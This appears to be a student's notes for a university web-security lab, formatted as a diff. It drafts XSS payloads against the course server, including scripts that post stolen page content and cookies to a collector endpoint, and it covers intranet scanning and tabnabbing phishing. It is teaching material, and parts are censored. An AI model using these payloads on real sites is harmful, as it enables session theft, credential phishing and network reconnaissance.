@@ -1,0 +1,359 @@
+Objectives
+1. Attack a web application by exploiting its XSS vulnerabilities to infect its users as persistently as possible.
+2. Write XSS exploits to launch a social engineering attack and trick a simulated user into giving up their credentials.
+3. Research basic cookie management and how to secure them.
+
+
+Task 1: 
+Learn about iframe
+https://www.geeksforgeeks.org/html-iframes/
+
+<iframe src="URL" title="description"></iframe>
+
+
+
+Let’s learn about a tag <a>
+
+The <a> tag in HTML stands for "anchor" and is used to create hyperlinks.  These links can point to other web pages, specific sections within a page, files to download, email addresses, or other resources.  It's a fundamental element for navigation on the web.
+
+<a href="https://www.example.com">Link to Example.com</a>
+
+rel: Specifies the relationship between the current document and the linked document. Used for SEO and other purposes. Common values include:
+nofollow: Tells search engines not to pass link equity to the linked page.
+noopener: Prevents the new tab from being able to access the original page via the window.opener property (important for security when using target="_blank").
+noreferrer: Prevents the Referer header from being sent to the linked website (also for privacy).
+target="_blank": This attribute tells the browser where to open the linked page. _blank specifically means "open the link in a new browsing context." This usually translates to a new tab or a new window, depending on the user's browser settings. Without target="_blank", the link would open in the same tab or window, replacing the current page.
+
+What is a Promise?
+
+https://www.codecademy.com/learn/webdev-intermediate-javascript/modules/javascript-promises/cheatsheet
+
+What is Parse?
+
+https://developer.mozilla.org/en-US/docs/Glossary/Parse
+https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model
+Imagine DOM like a tree branch
+
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String
+
+https://www.w3schools.com/xml/xml_syntax.asp
+
+What is a Fetch? 
+https://www.w3schools.com/js/js_api_fetch.asp
+
+fetch(file)
+.then(x => x.text())
+.then(y => myDisplay(y));
+
+
+You can use the fetch API in JavaScript to make a POST request to your Message Receiver Endpoint. Here's how you can do it:
+Example Code:
+javascript
+CopyEdit
+fetch("https://cs6262.gtisc.gatech.edu/receive/jzeng99/1308", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ username: "your-GT-username" }) // Replace with your actual GT username
+})
+.then(response => response.json()) // Parse JSON response
+.then(data => console.log("Success:", data))
+.catch(error => console.error("Error:", error));
+
+
+
+
+
+Task 2: Exploit the Reflected-XSS
+
+
+Reflective is generally an XSS attack where the attacker sends the victim a link to a reputable website. BUT, this link contains malicious javascript code. For example,
+https://www.facebook.com/login?username=username&password=password<script>steal-your-information.js</script>
+
+If the website returns the data in an unsafe manner (does not sanitize the output) and the victim clicks on this link, then the malicious code will be executed in the context of the victim’s session.
+
+How to craft:
+
+https://portswigger.net/web-security/cross-site-scripting/reflected
+
+
+https://cs6262.gtisc.gatech.edu/receive/jzeng99/1308?term=<script>/*+Bad+stuff+here...+*/</script>
+
+
+https://cs6262.gtisc.gatech.edu/search?keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+
+Explore all endpoints
+
+https://cs6262.gtisc.gatech.edu/writeup
+
+Funny I learned to set up XSStrike, Burp Suite, XSSer, Wfuzz, and Nikto. The problem is working on the wrong endpoint. 
+
+Hint: try logging out
+
+
+<img src="x" CENSORED 
+
+
+
+
+
+Task 3: Evolve to Persistent Client Side XSS
+
+Stored XSS:
+
+https://www.ndss-symposium.org/ndss-paper/dont-trust-the-locals-investigating-the-prevalence-of-persistent-client-side-cross-site-scripting-in-the-wild/
+
+The fourth:  Persistent Client-Side XSS, caused by the insecure use of client-side storage
+
+Maybes:
+
+
+<script> localStorage.setItem("cs6262-web-security-user-theme", "<script> alert('XSS Attack!') <\/script>"); </script> 
+
+CENSORED
+
+<script>   if (!localStorage.getItem('alertTriggered')) {     // Store a flag indicating that the alert should pop up     localStorage.setItem('alertTriggered', 'alert("XSS Alert Triggered!")');   } else {   eval(localStorage.getItem('alertTriggered'));   } </script>
+
+
+
+
+
+https://cs6262.gtisc.gatech.edu/search?keyword=%3Cscript%3E++++if+%28%21localStorage.getItem%28%27payload%27%29%29+%7B+localStorage.setCENSORED
+
+https://cs6262.gtisc.gatech.edu/
+
+themeSwitch
+
+
+<script> var value = localStorage.getItem("cs6262-web-security-theme-mode");
+document.write("<a href=''><script>alert(1)</script>'></a>"); </script>
+
+
+var value = localStorage.getItem("USER_THEME_KEY");
+
+document.write("<a href=''><script>alert(1)</script>'></a>")
+
+
+<script> CENSORED
+
+
+
+Task 4: 
+
+
+
+<b><u>testing</u></b>
+
+<script>
+fetch('https://cs6262.gtisc.gatech.edu/receive/jzeng99/1308', {
+        method: 'POST',
+        CENSORED
+
+</script>
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                                                                                                                <p><b><u>testing</u></b></p>
+
+<script> 
+fetch('/console') 
+
+    .then(response => response.text())
+
+    .then(html => {
+
+fetch('/session-hijacking', {
+    method: 'POST',
+        headers: {
+        "Content-Type": "application/json"
+    },
+    CENSORED
+        });
+     });
+
+});
+
+</script>
+
+                
+
+                
+                
+                
+      Url: 
+              
+https://cs6262.gtisc.gatech.edu/session-hijacking
+
+
+<p><b><u>testing</u></b></p>
+
+<script> 
+fetch('/console') 
+
+    .then(response => response.text())
+
+    .then(html => {
+         
+CENSORED
+        body: html
+
+     });
+
+});
+
+</script>
+
+
+
+
+
+
+
+
+<script>
+function getCookieValue(cookieName) {
+    const name = cookieName + "=";
+    const decodedCookie = decodeURIComponent(document.cookie); // Decode for special characters
+    const cookieArray = decodedCookie.split(';');
+  
+    for (let i = 0; i < cookieArray.length; i++) {
+      let cookie = cookieArray[i];
+      while (cookie.charAt(0) === ' ') {
+        cookie = cookie.substring(1); // Remove leading spaces
+      }
+     CENSORED
+}
+
+hijack()
+
+</script>
+
+
+
+
+Task 5. Launch Attacks (50%)
+You just have learned how to exploit XSS in various ways. In this task, you will learn what XSS is capable of.
+Task 5.1. ReDoS (10%)
+You’ve learned from the DoS lecture that GitHub was attacked in March 2015. Those flooding requests came from browsers! Application layer DoS attacks are difficult to stop because a request sent by a bot is the same as a request from a legitimate user. Common mitigation against request flooding is applying challenges like reCaptcha. What if we can still exhaust the server’s resources without flooding requests? A throttle to frequent requests won’t be able to stop it!
+Regular Expression Denial of Service (ReDoS) is one type of application layer, DoS. Due to the nature of single-threaded JavaScript and its event-loop architecture, if an event takes a long time to execute, the JavaScript thread will not be able to process other normal events. Imagine what if it takes 5 seconds to check a single regular expression. It impacts other users’ experiences severely since the web server is so busy processing the single regular expressions which result in a denial of service to other users.
+Here are some references:
+https://www.cloudflare.com/learning/ddos/application-layer-ddos-attack/
+https://en.wikipedia.org/wiki/ReDoS
+https://sec.okta.com/articles/2020/04/attacking-evil-regex-understanding-regular-expression-denial-service
+Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers
+Requirements
+Read the references above to understand what ReDoS is and its impact. In this task, you will try one kind of ReDoS attack.
+You will find the ReDoS section on the console page. Try to compose a username and password combination to launch a ReDoS attack against the ReDoS server. When an attack is successful, a hash value will be available for you to submit.
+Tips
+The username can be a regular expression.
+Read the materials above, and you will find the solution.
+Deliverables
+1. The hash value you find.
+2. Username and password you used to launch the ReDoS attack
+
+
+https://en.wikipedia.org/wiki/ReDoS
+
+
+Task 5.2: 
+
+/* Coding section start */
+
+
+async function scan(suffix) {
+    const controller = new AbortController();
+    const signal = controller.signal; 
+    const timeoutId = setTimeout(() => {
+      controller.abort();
+    }, 250);
+
+    CENSORED
+    }
+    await fetch('https://cs6262.gtisc.gatech.edu/receive/jzeng99/1308',  { method: 'POST', body: results });
+}
+
+scanAll();
+
+/* Coding section end */
+
+
+Task 5.2. Local Web Server Scanning (15%)
+Network work scanning has been well studied. You have practiced Nmap in Project 1. In order to scan the intranet using Nmap, you need access to a host in the intranet, which is quite difficult in general. However, by leveraging a user’s browser running on a host inside the intranet, you are still able to scan the intranet
+GT CS 6262: Network Security
+by injecting malicious scripts. There are some interesting materials related to intranet scanning using a browser. These vulnerabilities were mitigated since they were disclosed. However, given the common incorrect "Access-Control-Allow-Origin" setup in an intranet network, you may be lucky to sniff something from your target’s local network.
+As we learned from the lectures, a DNS rebinding attack allows an attacker to bypass SOP, thereby the attacker can read content from intranet web servers. But before launching a DNS rebinding attack, one must know what web servers are available in that organization. A local webserver scanning can help the attacker determine the targets.
+Now, assume you, as the attacker, have already learned the local IP address range below. And your goal is to determine what IP addresses are serving web content. (Recall the port number or protocol name for serving web content.) A web server will respond "hello" in plain text.
+The local host IP range is from 172.16.238.4 to 172.16.238.255, which is what you need to scan. These hosts are not accessible from outside as it’s only accessible to the victims - a user or an admin.
+Requirements
+1. Recall the techniques used for task 4 that launches a stored XSS attack on the admin. Start an admin instance to visit your post that carries the scanning code.
+2. Report what IP addresses are serving web content. And fill them in the questionnaire.
+Tips
+1. console.log logs messages in the browser which executes the code. I.e., a simulated user executes your code, then the message will be logged in the user’s browser. You won’t be able to see it in your browser. To receive the message, you need to forward the response to your endpoint.
+2. The message sent to the endpoint is in serial, meaning the latter one will override the previous one. Please consider aggregating the result first and sending it back to your endpoint. Promise.all is your best friend for this.
+3. You are given a known IP (172.16.238.10) for testing purposes. Don’t report this one in your questionnaire.
+Deliverables
+1. Local server IPs in the format of ip1,ip2,ip3,.... No spaces between them. Only comma separated.
+Rubric
+You will get 15% for all correct IP addresses and 0% for all incorrect.
+Each correct IP reported
+3%
+Each incorrect IP reported
+-3%
+Missing task5_2.js with your submission
+0%
+Recommended Reading to Learn More
+Here are some references to cross-origin vulnerabilities:
+https://portswigger.net/web-security/cors/access-control-allow-origin
+https://www.pivotpointsecurity.com/blog/cross-origin-resource-sharing-security/
+These two articles below are related to using WebRTC to scan from a browser because of the mechanism of establishing a peer to peer connection if you are interested. These are past-tense anyways, but you are welcome to think of any new ideas related to this.
+A Browser Scanner: Collecting Intranet Information
+GT CS 6262: Network Security
+https://medium.com/tenable-techblog/using-webrtc-ice-servers-for-port-scanning-in-chrome-ce17b19dd474
+
+
+
+5.3:
+
+Task 5.3. Tabnabbing (25%)
+In this task, you are determined to steal other users’ credentials. As per an online survey, you learn people open 10~20 tabs on average to surf the Internet. Therefore, you think tabnabbing, one of the phishing attacks that lure users into giving up their credentials, could be a good social engineering attack vector.
+Here are some references about what tabnabbing is.
+https://owasp.org/www-community/attacks/Reverse_Tabnabbing
+https://en.wikipedia.org/wiki/Tabnabbing
+https://medium.com/@shatabda/security-tabnabbing-what-how-b038a70d300e
+Given restrictions https://cs6262.gtisc.gatech.edu has and you being able to exploit the XSS vulnerabilities only, you have to implement a variant of tabnabbing following the requirements below.
+Requirements
+1. You will create a URL with the necessary payload to deploy the attack to a simulated user like task 1 and task 2.
+2. Your payload should modify all the <A> tags on the website, so when a user clicks any links on the website, a new tab will open to load the content.
+3. When the user focuses on the newly opened tab, the opener tab (the page whose URL has your payload) should remain unchanged until the user has lost focus on it for more than 60 seconds.
+a. When a user switches back to the opener tab, the timer should reset. When the user leaves the opener tab, the timer starts counting.
+b. When a user spends more than 60 seconds on the opened tab, the opener tab should load a phishing page (https://cs6262.gtisc.gatech.edu/tabnabbing/your-GT-username) which is provided by us below. After the simulated user submits her credentials, you will receive a hash string in your Message Receiver Endpoint.
+4. The favicon and title of the opener tab should NOT change. Because those are shown on the tab. If they are changed, the user may not find the tab and see your phishing page.
+GT CS 6262: Network Security
+And, the URL in the address bar should NOT change for the opener tab. Vigilant users may also look at the address bar to determine whether the URL is correct. So, it’s better to keep the original URL to get the user’s trust.
+
+
+
+Task 5. The tabnabbing phishing page should look exactly the same as the one below. The arrows are just for highlighting things you need to pay attention to. The one we used to grade yours is without arrows or the black rectangle. In the image comparison, we will not compare the URL in the address bar as people have different approaches. So, you will need an iframe to load the tabnabbing page.
+Tips
+1. The easiest way to keep the title/favicon/URL in the address unchanged is to load your tabnabbing page into an iframe. Think of ways to load an iframe full screen.
+2. You can access the tabnabbing page via https://cs6262.gtisc.gatech.edu/tabnabbing/your-GT-username to check what it looks like. The title is different from what is required. The only correct username and password combination will give you the correct hash string.
+3. To test your payload, you can open a new browser tab. Copy and paste your URL into the address bar. Then click a random link to see if it opens in a new tab for you. The browser should auto focus on the new tab. Stay in the new tab for 10 seconds and switch back to your opener tab. Nothing should change on the opener page. Then focus on the opened tab again for at least 60 seconds. Go back to the opener tab. You should see the tabnabbing login form. The simulated user would fill in the form with the correct credentials and submit it to your message receiver endpoint.
+4. As the web server has a length limit on the URL, you may find a JavaScript minifier helpful.
+5. Due to the constraints of our simulated environment, we have the following suggestions for your script:
+a. When you want to detect whether a user is on this page or not, don’t use focus/blur because they are not supported in the simulated environment. Use visibilitychange instead.
+b. There could be many ways to update the opener webpage after 60 seconds. One recommended way is to frequently check (e.g., using setInterval) how much time has passed since the user switched to another tab and update it after 60 seconds. If you use setTimeout to trigger the update after 60 seconds, you may experience failures in our testing environment because it is highly resource-constrained and has low time resolution.
+c. When you update the page to the tabnabbed page, we recommend you clear all the HTML body, create an iframe for the tabnabbed page using document.createElement('iframe'), and attach this DOM to the HTML body. Avoid using document.write(...) as it obstructs our bot from filling in the username and password.
+GT CS 6262: Network Security
+d. Avoid using window.open but to use setAttribute. e. The autograder is sensitive to even a tiny difference in the screenshot. Make sure your tabnabbed page does not differ, e.g., by a line on the top.
+Deliverables
+1. The attacking URL that carries the functional payload to deploy a tabnabbing attack.
+2. The hash string you will see on your Message Receiver Endpoint after a successful attack.
+
